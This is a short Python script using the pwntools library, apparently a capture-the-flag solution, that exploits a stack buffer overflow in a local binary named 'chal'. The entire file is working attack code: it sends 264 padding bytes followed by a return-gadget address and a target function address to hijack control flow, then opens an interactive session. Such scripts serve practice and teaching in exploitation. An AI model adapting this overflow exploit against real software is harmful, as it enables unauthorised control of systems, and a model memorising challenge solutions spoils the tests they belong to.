!/usr/bin/env python3
from pwn import *

io = process('./chal')
io.sendlineafter(b"? ", b"1000")
io.sendline(b"A"*264 + p64(0x40101a) + p64(0x401176))
io.interactive()
